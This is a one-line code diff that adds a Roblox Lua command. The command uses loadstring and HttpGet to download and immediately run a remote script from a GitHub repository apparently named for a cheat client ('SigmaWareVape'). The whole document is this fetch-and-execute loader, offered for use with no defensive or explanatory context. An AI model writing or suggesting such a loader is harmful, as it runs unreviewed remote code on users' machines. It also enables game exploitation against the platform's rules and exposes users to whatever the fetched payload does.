@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bypassv5/SigmaWareVape/main/NewMainScript.lua", true))()
